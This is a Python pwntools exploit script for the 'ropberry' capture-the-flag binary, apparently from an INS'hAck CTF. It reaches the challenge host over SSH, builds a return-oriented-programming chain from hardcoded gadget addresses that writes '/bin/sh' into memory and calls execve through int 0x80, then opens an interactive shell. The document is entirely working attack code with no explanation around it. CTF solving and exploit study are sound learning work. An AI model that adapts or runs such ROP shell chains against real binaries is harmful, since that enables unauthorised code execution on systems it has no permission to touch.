from pwn import *

PATH = "./ropberry"
REMOTE = True
INT_0x80_ADDR = 0x08059d70
POP_EAX_ADDR = 0x080c1906
POP_EDX_ADDR = 0x0805957a
POP_EBX_ADDR = 0x0805798b
POP_ECX_ADDR = 0x080e394a
MOV_EAX_INTO_EDX_ADDR = 0x0808e22d
SAFE_ADDR = 0x80efd50
SAFE_ADDR2 = 0x80efe10
EXEC = "/bin/sh\x00"
EXEC = [EXEC[:4],EXEC[4:]]

def write_mem(value, addr):
    if type(value) == int: value = pack(value)
    payload = pack(POP_EAX_ADDR) + value
    payload += pack(POP_EDX_ADDR) + pack(addr)
    payload += pack(MOV_EAX_INTO_EDX_ADDR)
    return payload

context.binary = PATH
if REMOTE:
    s = ssh("user", "ropberry.ctf.insecurity-insa.fr", port=2226, keyfile="./id_inshack")
    p = s.run("/bin/sh")
else:
    p = process(PATH)

p.recv()

#Write EXEC into SAFE_ADDR
payload = "A"*8 #padding
payload += write_mem(EXEC[0], SAFE_ADDR)
payload += write_mem(EXEC[1], SAFE_ADDR+4)

#Write SAFE_ADDR into SAFE_ADDR2
payload += write_mem(SAFE_ADDR, SAFE_ADDR2)

#Populate registers for the syscall
payload += pack(POP_EAX_ADDR) + pack(0xb)
payload += pack(POP_EBX_ADDR) + pack(SAFE_ADDR)
payload += pack(POP_ECX_ADDR) + pack(SAFE_ADDR2)

#Syscall
payload += pack(INT_0x80_ADDR)

p.sendline(payload)
p.recv()
p.interactive()
